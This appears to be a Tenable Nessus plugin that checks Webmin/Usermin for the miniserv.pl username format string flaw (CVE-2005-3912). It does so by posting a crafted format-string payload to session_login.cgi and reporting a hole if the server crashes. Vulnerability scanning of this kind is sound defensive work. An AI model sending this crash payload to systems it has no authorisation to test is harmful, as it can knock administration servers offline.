#
# (C) Tenable Network Security
#


if (description) {
  script_id(20343);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2005-3912");

  script_name(english:"Webmin miniserv.pl username Parameter Format String Vulnerability");
  script_summary(english:"Checks for username parameter format string vulnerability in Webmin miniserv.pl");
 
  desc = "
Synopsis :

The remote web server is affected by a format string vulnerability. 

Description :

The remote host is running Webmin or Usermin, web-based interfaces for
Unix / Linux system administrators and end-users. 

Webmin and Usermin both come with the Perl script 'miniserv.pl' to
provide basic web services, and the version of 'miniserv.pl' installed
on the remote host contains a format string flaw when logging failed
authentication attempts.  Using specially-crafted values for the
'username' parameter of the 'session_login.cgi', an attacker may be
able to exploit this flaw to crash the affected server or potentially
to execute arbitrary code on the affected host under the privileges of
the userid under which 'miniserv.pl' runs, by default root. 

See also : 

http://www.dyadsecurity.com/webmin-0001.html
http://www.securityfocus.com/archive/1/archive/1/418093/100/0/threaded
http://www.webmin.com/security.html

Solution : 

Upgrade to Webmin version 1.250 / Usermin version 1.180 or later. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/I:P/A:P/B:A)";
  script_description(english:desc);

  script_category(ACT_DENIAL);
  script_family(english:"Gain root remotely");

  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("webmin.nasl");
  script_require_ports("Services/www", 10000);

  exit(0);
}


include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:10000);
if (!get_port_state(port)) exit(0);
if (!get_kb_item("www/" + port + "/webmin"));
if (http_is_dead(port:port)) exit(0);


# Try to exploit the flaw.
exploit = string("%250", crap(data:"9", length:20), "d");
postdata = string(
  "page=/&",
  "user=", exploit, "&",
  "pass=", SCRIPT_NAME
);
req = string(
  "POST /session_login.cgi HTTP/1.1\r\n",
  "Host: ", get_host_name(), "\r\n",
  "Content-Type: application/x-www-form-urlencoded\r\n",
  "Content-Length: ", strlen(postdata), "\r\n",
  'Cookie2: version="1"', "\r\n",
  "Cookie: testing=1\r\n",
  "\r\n",
  postdata
);
res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE, embedded:TRUE);


# There's a problem if MiniServ appears down.
if (isnull(res)) {
  if (http_is_dead(port:port)) security_hole(port);
}
